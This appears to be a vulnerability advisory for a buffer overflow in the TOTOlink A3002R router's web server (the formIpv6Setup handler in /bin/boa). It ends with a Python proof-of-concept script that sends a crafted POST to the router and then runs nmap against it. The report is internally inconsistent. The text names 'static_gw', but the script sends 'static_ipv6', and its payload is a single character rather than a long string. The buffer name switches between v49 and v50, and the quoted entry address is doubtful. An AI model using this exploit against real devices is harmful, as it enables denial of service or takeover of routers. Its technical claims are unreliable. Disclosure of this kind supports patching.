# TARGET
TOTOlink A3002R
V1.1.1-B20200824.0128
# BUG TYPE
buffer overflow
# Abstract
The TOTOlink A3002R router device contains a buffer overflow vulnerability in its firmware version V1.1.1-B20200824.0128. The vulnerability arises from the improper input validation of the `static_gw` parameter in the `formIpv6Setup` interface of `/bin/boa`. A remote attacker could exploit this flaw to execute arbitrary code on the system or cause a denial of service.
# Details
`/squashfs-root/bin/boa`

![](https://github.com/SunnyYANGyaya/firmcrosser/blob/main/ToTolink/figures/Snipaste_2025-01-16_22-19-45.png)
By analyzing the `formIpv6Setup` function in `/bin/boa` using IDA, we find that the entry address of the function is `0x27BDFD68`. It is evident that the `v36` variable is passed to `v50` via `strcpy` without any filtering or length checks. Through further analysis, it is clear that the controllable `static_gw` parameter can lead to a buffer overflow vulnerability. The function `sub_410510` reads the user-provided "static_gw" data, and `strcpy` copies the string pointed to by `v36` to `v50` without verifying whether `v49` has enough space to store the copied string. If the string pointed to by `v36` exceeds the size of the `v50` buffer, it can cause a buffer overflow, potentially overwriting adjacent memory regions and leading to undefined behavior. This may result in program crashes or, if exploited by an attacker, further compromise the system.

![](https://github.com/SunnyYANGyaya/firmcrosser/blob/main/ToTolink/figures/Snipaste_2025-01-16_22-22-03.png)
An attacker can exploit the buffer overflow vulnerability by sending an API request, using a malicious configuration file, or crafting a specially crafted HTTP request with an excessively long `static_gw` string, potentially causing the program to crash.


# POC

```
import requests
import os 
url = "http://192.168.0.1/boafrm/formIpv6Setup"
headers = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "application/x-www-form-urlencoded",
	"Content-Length": "1981",
	"Origin": "http://192.168.0.1",
	"Connection": "close",
	"Referer": "http://192.168.0.1/parent.htm",
	"Upgrade-Insecure-Requests": "1",
	"Priority": "u=4",
}

repeated = "A"
data = "wan_enable=1&OriginType=1&enable_dhcpv6RapidCommit=1&static_ipv6=111{}".format (repeated)

response = requests.post (url, data=data, headers=headers,verify=False)
#print(response.text)
print ("nmap... ...")
os.system ("nmap 192.168.0.1")
```
